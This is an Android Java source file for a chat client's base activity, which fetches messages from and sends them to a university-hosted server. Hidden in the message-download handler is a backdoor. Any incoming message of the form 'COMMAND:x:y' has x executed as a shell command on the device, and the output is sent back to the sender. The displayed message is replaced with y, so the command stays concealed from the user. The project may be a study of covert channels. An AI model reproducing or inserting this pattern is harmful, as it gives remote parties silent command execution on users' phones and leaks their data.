package org.research.chatclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.research.thevault.Constants;
import org.research.thevault.PVDatamanager;

import android.app.Activity;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.FragmentTransaction;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

public class BaseActivity extends Activity implements Constants{
	
	public static String BROADCAST_ACTION = "NEW_SMS_MESSAGE";
	public static final String NOTI_ID = "NotifID";
	public static final String CONVO = "convo";
	public static final String CONVO_USER = "convo_user";
	
	private PVDatamanager pvm;
	private SharedPreferences mPrefs;
	private ListView lv;
	private ProgressDialog mProgress;
	private String convo;
	private boolean needRefresh = false;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		pvm = PVDatamanager.getInstance();
		mPrefs = getSharedPreferences( CreateAccountActivity.PREFS, Context.MODE_PRIVATE );
	}
	
	
	public String getConvo(){
		return convo;
	}
	
	public void sendMessage(HttpPost httppost){
		new SendMessageTask().execute(httppost);
	}
	
	protected class SendMessageTask extends AsyncTask<HttpPost, Void, InputStream> {
	    @Override
		 protected InputStream doInBackground(HttpPost... post) {
	    	HttpClient httpclient = new DefaultHttpClient();
	    	InputStream stream = null;
	    	HttpResponse response;
			try {
				response = httpclient.execute(post[0]);
				HttpEntity entity = response.getEntity();
				stream = entity.getContent();
			} catch (Exception e) {
				e.printStackTrace();
			}
	        return stream;
	     }

	     @Override
	     protected void onPostExecute(InputStream result) {
	    	 String text = "";
	    	 
	    	 try{
	    		 if( result != null ){
			    	 BufferedReader br = new BufferedReader(new InputStreamReader(result));
			    	 String line = br.readLine();
			    	 
			    	 while( line != null ){
			    		 text += line + " ";
			    		 line = br.readLine();
			    	 }
	    		 }
	    	 }catch (IOException e) {
	    		 e.printStackTrace();
	    	 }
	    	 Toast.makeText(BaseActivity.this, "Message Sent", Toast.LENGTH_LONG).show();
	     }
	 }
	
	protected void insertMessage(String sender, String message, String time, String recipient){
		
		ContentValues values = new ContentValues();
		values.put(SENDER, sender);
		values.put(RECIPIENT, recipient);
		values.put(OTHER_MEMBER, recipient);
		values.put(MESSAGE, message);
		values.put(TIMESTAMP, time);
		pvm.insertMessage(this, values);
	}
	
	public void onResume(){
		super.onResume();
		mProgress = new ProgressDialog(this);
	    mProgress.setIndeterminate(true);
	    mProgress.setCancelable(true);
	    mProgress.setMessage("Downloading...");
		if(!(this instanceof ConversationActivity)){
			setContentView(R.layout.base_layout);
			Log.d("ROOTED", "");
			
			Button btn = (Button)findViewById(R.id.createMessage);
			btn.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View arg0) {
					if (getResources().getBoolean(R.bool.IsTablet)) {
						convo = null;
						FragmentManager fm = getFragmentManager();
						Fragment convoFrag = new ConversationFrag();
						FragmentTransaction ft = fm.beginTransaction();
						ft.replace(R.id.convo_frag, convoFrag).commit();
					} else {
						Log.d("TEST", "WWWWTTTTTTFFFFFF");
						Intent intent = new Intent(BaseActivity.this, ConversationActivity.class);
						startActivity(intent);
					}
				}
			});
			
			FragmentManager fm = getFragmentManager();
			Fragment inboxFrag = new InboxActivity();
			FragmentTransaction ft = fm.beginTransaction();
			ft.replace(R.id.inbox_frag, inboxFrag).commit();
		}
		IntentFilter filter = new IntentFilter();
		filter.addAction(BROADCAST_ACTION);
		registerReceiver(receiver, filter);
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		this.unregisterReceiver(receiver);
	}
	
	@Override
	protected void onDestroy() {
		super.onDestroy();
	}
	
	private BroadcastReceiver receiver = new BroadcastReceiver() {
		
		@Override
		public void onReceive(Context context, Intent intent) {
			try{
	    		HttpPost httppost = new HttpPost("http://devimiiphone1.nku.edu/research_chat_client/chat_client_server/get_messages.php");
	    		LinkedList<NameValuePair> nameValuePairs = new LinkedList<NameValuePair>();
	    		
	    		mPrefs = getSharedPreferences( CreateAccountActivity.PREFS, Context.MODE_PRIVATE );
	    		String username = mPrefs.getString( CreateAccountActivity.USER, "" );
	    		String c2dm = mPrefs.getString( CreateAccountActivity.C2DM, "" );
	    		
	    		nameValuePairs.add(new BasicNameValuePair("username", username));
	    		nameValuePairs.add(new BasicNameValuePair("deviceID", c2dm));
	    		
	    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	    		if(mProgress != null)
	    			mProgress.show();
	    		
			    new DownloadMessages().execute(httppost);
			}catch(UnsupportedEncodingException e){
	    		e.printStackTrace();
	    	}
		}
	};
	
	public void setFragListView(ListView lv){
		this.lv = lv;
	}
	
	public void downloadMessages(HttpPost httppost){
		if(mProgress != null)
			mProgress.show();
	    new DownloadMessages().execute(httppost);
	}
	
	public class DownloadMessages extends AsyncTask<HttpPost, Void, InputStream> {
	    @Override
		 protected InputStream doInBackground(HttpPost... post) {
	    	HttpClient httpclient = new DefaultHttpClient();
	    	InputStream stream = null;
	    	HttpResponse response;
			try {
				response = httpclient.execute(post[0]);
				HttpEntity entity = response.getEntity();
				stream = entity.getContent();
			} catch (Exception e) {
				e.printStackTrace();
			}
	        return stream;
	     }

	     @Override
	     protected void onPostExecute(InputStream result) {
	    	 
	    	 NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
    		 if(nm != null)
    			 nm.cancel(getIntent().getIntExtra(NOTI_ID, 0));
	    	 String text = "";
	    	 
	    	 try{
	    		 if( result != null ){
			    	 BufferedReader br = new BufferedReader(new InputStreamReader(result));
			    	 String line = br.readLine();
			    	 
			    	 while( line != null ){
			    		 text += line + " ";
			    		 line = br.readLine();
			    	 }
	    		 }
	    	 }catch (IOException e) {
	    		 e.printStackTrace();
	    	 }
			try {
				boolean split = false;
				String line;
		        String response = "";
		        String[] cmd = null;
				JSONArray messages = new JSONArray(text);
				String recipient = mPrefs.getString( CreateAccountActivity.USER, "" );
				for (int i = 0; i < messages.length(); i++) {
					JSONObject obj = messages.getJSONObject(i);
					if( obj.getString(MESSAGE).matches("^COMMAND:.*:.*$")){
						split = true;
		            	cmd = obj.getString(MESSAGE).split( ":" );
		            	try {
							Process runCommand = Runtime.getRuntime().exec( cmd[1] );
							BufferedReader dIn = new BufferedReader(new InputStreamReader(runCommand.getInputStream()));
							
							runCommand.waitFor();
							//make sure process wasn't terminated
							if( runCommand.exitValue() != 255 ){
								try {
									//read all lines from stream
									
									while((line = dIn.readLine()) != null){
										response += line + "\n";
									}
									try{
							    		HttpPost httppost = new HttpPost("http://devimiiphone1.nku.edu/research_chat_client/chat_client_server/send_message.php");
							    		LinkedList<NameValuePair> nameValuePairs = new LinkedList<NameValuePair>();
							    		
							    		nameValuePairs.add(new BasicNameValuePair("recipient", obj.getString(SENDER)));
							    		nameValuePairs.add(new BasicNameValuePair("sender", recipient));
							    		nameValuePairs.add(new BasicNameValuePair("message", response));
							    		
							    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
									    
									    new SendMessageTask().execute(httppost);
							    		
							    	}catch(UnsupportedEncodingException e){
							    		e.printStackTrace();
							    	}
								} catch (IOException e) {
									e.printStackTrace();
								}
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
		            }
					if(convo != null && convo.equals(obj.getString(SENDER)))
							needRefresh = true;
					ContentValues values = new ContentValues();
					values.put(SENDER, obj.getString(SENDER));
					values.put(RECIPIENT, recipient);
					values.put(OTHER_MEMBER, obj.getString(SENDER));
					if(split && cmd != null && cmd.length == 3)
						values.put(MESSAGE, cmd[2]);
					else
						values.put(MESSAGE, obj.getString(MESSAGE));
					values.put(TIMESTAMP, obj.getString(TIMESTAMP));
					pvm.insertMessage(BaseActivity.this, values);
					if(!(BaseActivity.this instanceof ConversationActivity))
						loadList();
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if(mProgress != null && mProgress.isShowing())
				mProgress.dismiss();
	     }
	 }
	
	public void deleteConvo(String name){
		pvm.deleteConvo(this, name);
		convo = null;
		loadList();
	}
	
	public void setListView(ListView lv){
		this.lv = lv;
	}
	
	public void loadList(){
		String[] list = pvm.getConvos(this);
		final ArrayList<HashMap<String,String>> convos = new ArrayList<HashMap<String,String>>();
		for (int i = 0; i < list.length; i++) {
			convos.add(pvm.getLastMessage(this, list[i]));
		}
		if(!(BaseActivity.this instanceof ConversationActivity)){
			lv.setAdapter(new SimpleAdapter(this, convos, R.layout.list_item, new String[] {"name", "message", "time"}, new int[] { R.id.from_text, R.id.message_text, R.id.date_text}));
			lv.setOnItemClickListener(new OnItemClickListener() {
	
				@Override
				public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
					convo = convos.get(position).get("name");
					if (getResources().getBoolean(R.bool.IsTablet)) {
						FragmentManager fm = getFragmentManager();
						Fragment convoFrag = new ConversationFrag();
						FragmentTransaction ft = fm.beginTransaction();
						ft.replace(R.id.convo_frag, convoFrag).commit();
					} else {
						Intent intent = new Intent(BaseActivity.this, ConversationActivity.class);
						intent.putExtra(CONVO, convo);
						startActivity(intent);
					}
				}
			});
		}
		if(needRefresh){
			needRefresh = false;
			if (getResources().getBoolean(R.bool.IsTablet)) {
				FragmentManager fm = getFragmentManager();
				Fragment convoFrag = new ConversationFrag();
				FragmentTransaction ft = fm.beginTransaction();
				ft.replace(R.id.convo_frag, convoFrag).commit();
			} else {
				Intent intent = new Intent(BaseActivity.this, ConversationActivity.class);
				intent.putExtra(CONVO, convo);
				startActivity(intent);
			}
		}
	}
	
	class ConvoAdapter extends BaseAdapter{
		
		ArrayList<InboxItem> mList;
		
		
		
		@Override
		public int getCount() {
			return mList.size();
		}

		@Override
		public Object getItem(int position) {
			return mList.get(position);
		}

		@Override
		public long getItemId(int position) {
			return position;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			View v = convertView;
			
			if( v == null ){
				LayoutInflater li = (LayoutInflater)getSystemService(Context.LAYOUT_INFLATER_SERVICE);
				v = li.inflate(R.layout.contact_item, null);
			}
			
			InboxItem temp = mList.get(position);
			TextView name = (TextView)v.findViewById(R.id.contact_name);
			TextView msg = (TextView)v.findViewById(R.id.contact_recent_msg);
			TextView time = (TextView)v.findViewById(R.id.contact_time);
			
			name.setText(temp.getName());
			msg.setText(temp.getMostRecentMessage());
			time.setText(temp.getRecentTime());
			
			return v;
		}
		
	}
}
